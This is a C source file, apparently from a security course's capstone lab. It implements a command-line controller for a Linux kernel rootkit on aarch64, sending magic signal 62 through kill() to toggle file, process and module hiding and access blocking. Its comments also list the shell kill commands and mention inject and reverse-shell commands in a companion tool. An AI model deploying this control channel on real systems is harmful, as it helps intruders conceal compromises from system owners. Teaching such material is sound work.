/*
 * rkcmd.c — Simple C2 helper tool for the capstone rootkit
 *
 * This is a convenience wrapper around kill(). For basic commands
 * (status, hide, block), this works fine. For extended commands
 * (add-gid, inject, revshell), use mykill instead — it preserves
 * x2-x7 via inline asm.
 *
 * You can also use kill(1) directly from the shell:
 *   kill -62 0    # status
 *   kill -62 1    # toggle file hiding
 *   kill -62 2    # toggle access blocking
 *   kill -62 3    # toggle module visibility
 *   kill -62 4    # toggle process hiding
 *
 * Build: aarch64-linux-gnu-gcc -static -o rkcmd rkcmd.c
 * Usage: ./rkcmd status | hide | block | hide-module | hide-procs
 *
 * This file is PROVIDED COMPLETE — you do not need to modify it.
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <signal.h>
#include <errno.h>

#define MAGIC_SIGNAL 62

static void usage(const char *prog)
{
	fprintf(stderr, "Usage: %s <command>\n", prog);
	fprintf(stderr, "Commands:\n");
	fprintf(stderr, "  status          Show rootkit status\n");
	fprintf(stderr, "  hide            Toggle file hiding on/off\n");
	fprintf(stderr, "  block           Toggle access blocking on/off\n");
	fprintf(stderr, "  hide-module     Toggle module visibility\n");
	fprintf(stderr, "  hide-procs      Toggle process hiding on/off\n");
	fprintf(stderr, "\nFor extended commands (inject, add-gid, revshell), use mykill.\n");
	exit(1);
}

int main(int argc, char **argv)
{
	if (argc < 2)
		usage(argv[0]);

	int pid_arg;
	const char *cmd = argv[1];

	if (strcmp(cmd, "status") == 0) {
		pid_arg = 0;
	} else if (strcmp(cmd, "hide") == 0) {
		pid_arg = 1;
	} else if (strcmp(cmd, "block") == 0) {
		pid_arg = 2;
	} else if (strcmp(cmd, "hide-module") == 0) {
		pid_arg = 3;
	} else if (strcmp(cmd, "hide-procs") == 0) {
		pid_arg = 4;
	} else {
		fprintf(stderr, "Unknown command: %s\n", cmd);
		usage(argv[0]);
	}

	if (kill(pid_arg, MAGIC_SIGNAL) < 0) {
		perror("kill");
		return 1;
	}

	printf("OK: sent kill(%d, %d) — command '%s'\n",
	       pid_arg, MAGIC_SIGNAL, cmd);
	return 0;
}
